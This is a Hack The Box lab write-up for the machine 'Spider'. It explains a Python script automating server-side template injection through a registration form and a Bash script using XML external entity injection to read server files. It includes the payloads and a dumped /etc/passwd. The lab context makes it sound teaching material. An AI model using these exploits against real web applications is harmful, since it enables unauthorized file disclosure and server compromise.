# Hack The Box. Machines. Spider

Machine write-up: https://7rocky.github.io/en/htb/spider

### `ssti.py`

This Python script is made to automate the explotation of a Server-Side Template Injection (SSTI) which appears when registering a new account at `http://spider.htb` and then reading the user profile. The vulnerable parameter is `username`.

We can perform the POST request using module `requests` (obviously). This request is done to `http://spider.htb/register` specifying `username`, `confirm_username`, `password` and `confirm_password` as request body:

```python
    data = {
        'username': username,
        'confirm_username': username,
        'password': password,
        'confirm_password': password
    }

    s = requests.session()
    r = s.post('http://spider.htb/register', data=data)
```

After that, we need to catch the UUID that the server gives us. For that we can use a regular expression using module `re`:

```python
    try:
        uuid = re.search(
            r'<input type="text" name="username" value="(.*?)" />', r.text).group(1)
    except AttributeError:
        print(r.text)
        sys.exit()
```

If an error occurs, we print the whole response to try looking for errors.

Then, we need to access to the profile created. For that, we need to perform another POST request (this time to `http://spider.htb/login`) specifying `uuid` and `password`:

```python
    s.post('http://spider.htb/login',
           data={'username': uuid, 'password': password})
    r = s.get('http://spider.htb/user')
```

However, this POST request only sets a cookie and redirects to the main page. By using a `requests` session we can keep the cookie for next requests.

If we access `http://spider.htb/user` (with a GET request), here is where we can see the SSTI payload being executed. We know that the data is in the `username` field. Again, using a regular expression we are able to extract the data we are interested in:

```python
    try:
        result = re.search(
            r'<input type="text" name="username" readonly value="(.*?)" />', r.text).group(1)
        result = result.replace('&#39;', "'").replace(
            '&lt;', '<').replace('&gt;', '>')
        print(result)
    except AttributeError:
        print(r.text)
```

Again, if an error occurs, we print the whole response.

Finally, we can execute the script as follows:

```console
$ python3 ssti.py '{{7*7}}'
49
```

### `xxe.sh`

This Bash script automates the process of reading files from the server exploiting an XML External Entity (XXE) injection.

We need to take into account how the XXE is exploitable. First, we need a port-forwarding so that port 8080 in the remote machine is mapped to port 8888 in our attacker machine (we did not choose 8080 because Burp Suite listens on that port).

Then, we can see that the data we provide in the login process is inserted in the cookie provided by the server (use Burp Suite or the browser developer tools to check the form parameters):

```console
$ curl http://localhost:8888/login -svH 'Content-Type: application/x-www-form-urlencoded' -d 'username=7Rocky&version=1.33.7'
*   Trying 127.0.0.1:8888...
* Connected to localhost (127.0.0.1) port 8888 (#0)
> POST /login HTTP/1.1
> Host: localhost:8888
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 30
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 FOUND
< Content-Type: text/html; charset=utf-8
< Content-Length: 217
< Location: http://localhost:8888/site
< Vary: Cookie
< Set-Cookie: session=.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ; HttpOnly; Path=/
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
* Connection #0 to host localhost left intact
<p>You should be redirected automatically to target URL: <a href="/site">/site</a>.  If not click the link.
```

To extract the data contained in the cookie, we can make use of module `flask_unsign` (you can install it with `pip`):

```console
$ python -m flask_unsign --decode --cookie '.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ'
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+', 'points': 0}

$ echo PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+ | base64 -d
<!-- API Version 1.33.7 -->
<root>
    <data>
        <username>7Rocky</username>
        <is_admin>0</is_admin>
    </data>
</root> 
```

So we have control of the `version` and the `username` field. To perform a XXE we need to insert an entity at the top of the XML document. The entity definition can be placed in the `version` parameter (after closing the comment tag). Then, in the `username` field we can call the entity.

This is the document we want to be generated:

```xml
<!-- API Version 1.33.7 -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!-- Pwned -->
<root>
    <data>
        <username>BEGINTAG
&xxe;
ENDTAG</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

Notice that `BEGINTAG` and `ENDTAG` are placed to use `grep` and extract the relevant data (which will be rendered in `&xxe;`).

This parameters must be placed in a `curl` POST request to `http://localhost:8888/login` as data. We are interested in the cookie that the server returns. That is why we use verbose mode and use `grep` and `sed` to get the exact value of a valid Cookie header:

```bash
data="username=BEGINTAG
%26xxe;
ENDTAG&version=1.33.7 -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://$file\"> ]>
<!-- Pwned"

cookie=$(curl http://localhost:8888/login -vsd "$data" 2>&1 | grep session= | sed 's/< Set-//g' | tr -d '\r\n')
```

This data of `&xxe;` will be rendered in the website, so we can use `curl` to `http://localhost:8888/site` providing the cookie obtained before:

```bash
res=$(curl http://localhost:8888/site -sH "$cookie")
```

Finally, using `grep` we can filter the file contents. This is done by obtaining the line numbers where `BEGINTAG` and `ENDTAG` are in the HTTP response. Then we can print the data between those numbers using `sed`:

```bash
begin=$(( $(echo "$res" | grep -n BEGINTAG | awk -F : '{ print $1 }') + 1 ))
end=$(( $(echo "$res" | grep -n ENDTAG | awk -F : '{ print $1 }') - 1 ))

echo -n "$res" | sed -n "${begin},${end}p"
```

For example, we can use the script to read `/etc/passwd`:

```console
$ bash xxe.sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
chiv:x:1000:1000:chiv:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```
